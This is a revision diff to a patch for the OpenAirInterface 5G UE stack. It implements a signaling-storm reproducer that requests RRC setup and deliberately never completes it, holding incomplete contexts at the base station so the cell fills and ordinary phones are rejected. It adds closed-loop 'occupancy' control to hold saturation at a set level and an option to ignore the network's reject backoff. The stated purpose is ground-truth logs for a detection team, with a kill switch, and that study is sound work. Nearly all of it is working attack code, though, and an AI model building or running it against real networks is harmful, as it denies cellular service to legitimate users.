@@ -1,5 +1,5 @@
 diff --git a/openair2/RRC/NR_UE/rrc_UE.c b/openair2/RRC/NR_UE/rrc_UE.c
-index 7858a82..77ec789 100644
+index 7858a82..a37b1c9 100644
 --- a/openair2/RRC/NR_UE/rrc_UE.c
 +++ b/openair2/RRC/NR_UE/rrc_UE.c
 @@ -386,6 +386,20 @@ static void nr_rrc_ue_prepare_RRCSetupRequest(NR_UE_RRC_INST_t *rrc)
@@ -23,7 +23,7 @@ index 7858a82..77ec789 100644
    uint8_t buf[1024];
    int len = do_RRCSetupRequest(buf, sizeof(buf), rv, rrc->fiveG_S_TMSI);
  
-@@ -2459,12 +2473,51 @@ static int8_t nr_rrc_ue_decode_ccch(NR_UE_RRC_INST_t *rrc, const NRRrcMacCcchDat
+@@ -2459,12 +2473,50 @@ static int8_t nr_rrc_ue_decode_ccch(NR_UE_RRC_INST_t *rrc, const NRRrcMacCcchDat
         case NR_DL_CCCH_MessageType__c1_PR_rrcReject:
           RRCLOG_W("Logical Channel DL-CCCH (SRB0), Received RRCReject \n");
           nr_rrc_process_rrcreject(rrc, dl_ccch_msg->message.choice.c1->choice.rrcReject);
@@ -57,9 +57,11 @@ index 7858a82..77ec789 100644
 +           NR_UE_Timers_Constants_t *tac = &rrc->timers_and_constants;
 +           nr_timer_stop(&tac->T300);
 +           nr_rss_note_msg4();
++           nr_rss_note_skip();
 +           nr_rss_log("msg4_rx",
-+                      "\"intended_reach\":\"msg5_skip\",\"actual_reach\":\"msg5_skip\",\"tc_rnti\":\"0x%04x\"",
-+                      rrc->rnti);
++                      "\"intended_reach\":\"msg5_skip\",\"actual_reach\":\"msg5_skip\",\"tc_rnti\":\"0x%04x\",\"occupancy\":%u",
++                      rrc->rnti,
++                      nr_rss_occupancy());
 +           nr_rss_arm_retry(rrc, 0);
 +         } else {
 +           if (nr_rss_enabled()) {
@@ -69,14 +71,11 @@ index 7858a82..77ec789 100644
 +                        rrc->rnti);
 +           }
 +           nr_rrc_process_rrcsetup(rrc, dl_ccch_msg->message.choice.c1->choice.rrcSetup);
-+           /* probe: hand the connection back so the run continues */
-+           if (nr_rss_enabled())
-+             nr_rss_arm_probe_release(rrc);
 +         }
           rval = 0;
           break;
  
-@@ -3650,6 +3703,7 @@ void nr_rrc_going_to_IDLE(NR_UE_RRC_INST_t *rrc,
+@@ -3650,6 +3702,7 @@ void nr_rrc_going_to_IDLE(NR_UE_RRC_INST_t *rrc,
    }
    // Stop all the timers except T302, T320 and T325
    nr_timer_stop(&tac->T300);
@@ -85,10 +84,10 @@ index 7858a82..77ec789 100644
    nr_timer_stop(&tac->T304);
    nr_timer_stop(&tac->T310);
 diff --git a/openair2/RRC/NR_UE/rrc_defs.h b/openair2/RRC/NR_UE/rrc_defs.h
-index edb1c9e..dae3647 100644
+index edb1c9e..bdbe119 100644
 --- a/openair2/RRC/NR_UE/rrc_defs.h
 +++ b/openair2/RRC/NR_UE/rrc_defs.h
-@@ -142,6 +142,13 @@ typedef struct UE_RRC_SI_INFO_NR_s {
+@@ -142,6 +142,12 @@ typedef struct UE_RRC_SI_INFO_NR_s {
  typedef struct NR_UE_Timers_Constants_s {
    // timers
    NR_timer_t T300;
@@ -98,15 +97,14 @@ index edb1c9e..dae3647 100644
 +     message and those do not arrive every 10 ms over ZMQ. */
 +  NR_timer_t rss_retry_timer;
 +  uint64_t rss_deadline_ns;        /* when the next attempt is due, 0 = not armed */
-+  uint64_t rss_probe_release_ns;   /* when a completed probe must be released, 0 = none */
    NR_timer_t T301;
    NR_timer_t T302;
    NR_timer_t T304;
 diff --git a/openair2/RRC/NR_UE/rrc_proto.h b/openair2/RRC/NR_UE/rrc_proto.h
-index b359d35..72dd90d 100644
+index b359d35..0f7098a 100644
 --- a/openair2/RRC/NR_UE/rrc_proto.h
 +++ b/openair2/RRC/NR_UE/rrc_proto.h
-@@ -72,6 +72,31 @@ void nr_rrc_ue_decode_NR_SBCCH_SL_BCH_Message(NR_UE_RRC_INST_t *rrc,
+@@ -72,6 +72,32 @@ void nr_rrc_ue_decode_NR_SBCCH_SL_BCH_Message(NR_UE_RRC_INST_t *rrc,
                                                const uint16_t rx_slss_id);
  
  void nr_rrc_set_mac_queue(instance_t instance, notifiedFIFO_t *mac_input_nf);
@@ -131,7 +129,8 @@ index b359d35..72dd90d 100644
 +int nr_rss_reject_backoff_ms(void);
 +unsigned nr_rss_next_seq(void);
 +void nr_rss_note_msg4(void);
-+void nr_rss_arm_probe_release(NR_UE_RRC_INST_t *rrc);
++void nr_rss_note_skip(void);
++unsigned nr_rss_occupancy(void);
 +void nr_rss_arm_retry(NR_UE_RRC_INST_t *rrc, int delay_ms);
 +void nr_rss_log(const char *event, const char *fmt, ...) __attribute__((format(printf, 2, 3)));
 +
@@ -139,10 +138,10 @@ index b359d35..72dd90d 100644
  #endif
  
 diff --git a/openair2/RRC/NR_UE/rrc_timers_and_constants.c b/openair2/RRC/NR_UE/rrc_timers_and_constants.c
-index 0addfe5..09b0492 100644
+index 0addfe5..ecb345e 100644
 --- a/openair2/RRC/NR_UE/rrc_timers_and_constants.c
 +++ b/openair2/RRC/NR_UE/rrc_timers_and_constants.c
-@@ -4,6 +4,274 @@
+@@ -4,6 +4,308 @@
  
  #include "openair2/RRC/NR_UE/rrc_proto.h"
  #include "executables/softmodem-common.h"
@@ -172,7 +171,8 @@ index 0addfe5..09b0492 100644
 +  int completion_pct;
 +  int max_duration_s;
 +  int ack_gate;
-+  int probe_hold_ms;
++  int target_occupancy;
++  int hold_ms;
 +  int tick_report;
 +  char *run_id;
 +  char *log_file;
@@ -186,10 +186,11 @@ index 0addfe5..09b0492 100644
 +  {"interval_ms",       "delay between a skipped Msg5 and the next RRCSetupRequest\n",   0, .iptr=&rss_cfg.interval_ms,       .defintval=100,                      TYPE_INT,    0}, \
 +  {"reject_backoff_ms", "delay after RRCReject when the gNB sent no waitTime\n",         0, .iptr=&rss_cfg.reject_backoff_ms, .defintval=1000,                     TYPE_INT,    0}, \
 +  {"honor_reject",      "1 = obey RRCReject waitTime/backoff, 0 = retry at once\n",      0, .iptr=&rss_cfg.honor_reject,      .defintval=1,                        TYPE_INT,    0}, \
-+  {"completion_pct",    "percent of attempts completed normally (0 = pure A-type)\n",    0, .iptr=&rss_cfg.completion_pct,    .defintval=0,                        TYPE_INT,    0}, \
++  {"completion_pct",    "percent completed normally. >0 ends the run at the first one\n",  0, .iptr=&rss_cfg.completion_pct,    .defintval=0,                        TYPE_INT,    0}, \
 +  {"max_duration_s",    "kill switch: stop the reproducer after this many seconds\n",    0, .iptr=&rss_cfg.max_duration_s,    .defintval=60,                       TYPE_INT,    0}, \
 +  {"ack_gate",          "1 = never restart RA while the Msg4 HARQ ACK PUCCH is pending\n", 0, .iptr=&rss_cfg.ack_gate,        .defintval=1,                        TYPE_INT,    0}, \
-+  {"probe_hold_ms",     "how long a completed probe stays connected before release\n",   0, .iptr=&rss_cfg.probe_hold_ms,     .defintval=1000,                     TYPE_INT,    0}, \
++  {"target_occupancy",  "hold this many incomplete contexts at the gNB (0 = unlimited)\n", 0, .iptr=&rss_cfg.target_occupancy, .defintval=0,                        TYPE_INT,    0}, \
++  {"hold_ms",           "gNB hold time per incomplete context (t300 + guard)\n",         0, .iptr=&rss_cfg.hold_ms,           .defintval=2000,                     TYPE_INT,    0}, \
 +  {"tick_report",       "log the measured RRC tick rate every N ticks (0 = off)\n",      0, .iptr=&rss_cfg.tick_report,       .defintval=100,                      TYPE_INT,    0}, \
 +  {"run_id",            "run identifier written into every JSONL record\n",              0, .strptr=&rss_cfg.run_id,          .defstrval="rss-run",                TYPE_STRING, 0}, \
 +  {"log_file",          "per-attempt JSONL ground truth for the detection team\n",       0, .strptr=&rss_cfg.log_file,        .defstrval="/tmp/rss_attempts.jsonl", TYPE_STRING, 0}, \
@@ -203,6 +204,17 @@ index 0addfe5..09b0492 100644
 +static unsigned rss_completed;
 +static FILE *rss_log_fd;
 +static bool rss_got_msg4;        /* did the current attempt reach Msg4? */
++/* Closed-loop occupancy control.
++   The occupancy the gNB sees is N = (incomplete attempts started in the last
++   T_hold). The UE can count that itself: every attempt we leave incomplete
++   holds one context for exactly hold_ms. So target_occupancy becomes a real
++   knob without any feedback from the gNB: below target we keep attacking,
++   at target we idle. Measured 2026-10-20: interval_ms alone cannot do this,
++   because the realised Msg4 rate saturates near 3.8/s regardless of interval. */
++#define RSS_OCC_WINDOW 512
++static uint64_t rss_skip_ts[RSS_OCC_WINDOW];
++static unsigned rss_skip_head;
++static unsigned rss_occ_hold_logs;
 +static unsigned rss_ticks;       /* RRC ticks seen while enabled */
 +static uint64_t rss_tick_t0_ns;  /* start of the current tick-rate window */
 +
@@ -304,11 +316,32 @@ index 0addfe5..09b0492 100644
 +  rss_got_msg4 = true;
 +}
 +
-+void nr_rss_arm_probe_release(NR_UE_RRC_INST_t *rrc)
++void nr_rss_note_skip(void)
 +{
-+  rrc->timers_and_constants.rss_probe_release_ns =
-+      rss_now_ns() + (uint64_t)rss_get_cfg()->probe_hold_ms * 1000000ULL;
++  rss_skip_ts[rss_skip_head] = rss_now_ns();
++  rss_skip_head = (rss_skip_head + 1) % RSS_OCC_WINDOW;
 +}
++
++unsigned nr_rss_occupancy(void)
++{
++  const uint64_t hold_ns = (uint64_t)rss_get_cfg()->hold_ms * 1000000ULL;
++  const uint64_t now = rss_now_ns();
++  unsigned n = 0;
++  for (unsigned i = 0; i < RSS_OCC_WINDOW; i++)
++    if (rss_skip_ts[i] != 0 && now - rss_skip_ts[i] < hold_ns)
++      n++;
++  return n;
++}
++
++/* A completed attempt leaves RRC in CONNECTED, and a new RRCSetupRequest is
++   only sent from RRC_IDLE, so the loop stops there. Releasing the connection
++   from this timer was tried on the box 2026-10-20 and crashed the UE right
++   after the release (probe_release -> resync -> SIGSEGV, run SAT-1019T220108Z),
++   so that path is removed. completion_pct > 0 therefore ends the run at its
++   first completed attempt and is only useful for one-shot checks.
++   Denial does not need it: once the cell is full the gNB answers an ordinary
++   RRCSetupRequest with RRCReject, which is logged as actual_reach=rrc_reject
++   and is exactly what a legitimate UE would receive. */
 +
 +/* Deterministic stride instead of a coin flip: the realised completion ratio is
 +   exact and the same run is replayable for the detection team. */
@@ -366,19 +399,6 @@ index 0addfe5..09b0492 100644
 +
 +  bool polled = nr_timer_tick(t);
 +
-+  /* A probe that completed normally would otherwise stay RRC_CONNECTED and end
-+     the run, because a new RRCSetupRequest is only sent from RRC_IDLE. Release
-+     it after probe_hold_ms so the measurement can continue. */
-+  if (tac->rss_probe_release_ns != 0 && rss_now_ns() >= tac->rss_probe_release_ns) {
-+    tac->rss_probe_release_ns = 0;
-+    if (nr_rss_enabled() && rrc->nrRrcState == RRC_STATE_CONNECTED_NR) {
-+      nr_rss_log("probe_release", NULL);
-+      nr_rrc_going_to_IDLE(rrc, OTHER, NULL);
-+      nr_rss_arm_retry(rrc, 0);
-+      return;
-+    }
-+  }
-+
 +  if (!polled || !nr_rss_enabled())
 +    return;
 +
@@ -395,6 +415,19 @@ index 0addfe5..09b0492 100644
 +    nr_timer_setup(t, 10, 10);
 +    nr_timer_start(t);
 +    return;
++  }
++
++  /* Occupancy ceiling: idle while the gNB already holds the requested number of
++     incomplete contexts. This is what makes the saturation level settable. */
++  if (cfg->target_occupancy > 0) {
++    unsigned occ = nr_rss_occupancy();
++    if (occ >= (unsigned)cfg->target_occupancy) {
++      if (rss_occ_hold_logs++ % 25 == 0)
++        nr_rss_log("occupancy_hold", "\"occupancy\":%u,\"target\":%d", occ, cfg->target_occupancy);
++      nr_timer_setup(t, 10, 10);
++      nr_timer_start(t);
++      return;
++    }
 +  }
 +
 +  /* Keep the Msg4 HARQ ACK. Restarting RA calls reset_ra(), whose memset clears
@@ -417,7 +450,7 @@ index 0addfe5..09b0492 100644
  
  void init_SI_timers(NR_UE_RRC_SI_INFO *SInfo)
  {
-@@ -177,6 +445,9 @@ void nr_rrc_handle_timers(NR_UE_RRC_INST_t *rrc)
+@@ -177,6 +479,9 @@ void nr_rrc_handle_timers(NR_UE_RRC_INST_t *rrc)
      handle_t300_expiry(rrc);
    }
  
@@ -427,7 +460,7 @@ index 0addfe5..09b0492 100644
    bool t301_expired = nr_timer_tick(&timers->T301);
    // Upon T301 expiry, the UE shall perform the actions upon going to RRC_IDLE
    // with release cause 'RRC connection failure'
-@@ -444,6 +715,8 @@ void nr_rrc_set_sib1_timers_and_constants(NR_UE_Timers_Constants_t *tac, NR_SIB1
+@@ -444,6 +749,8 @@ void nr_rrc_set_sib1_timers_and_constants(NR_UE_Timers_Constants_t *tac, NR_SIB1
          AssertFatal(false, "Invalid T300 %ld\n", sib1->ue_TimersAndConstants->t300);
      }
      nr_timer_setup(&tac->T300, k, 10); // 10ms step
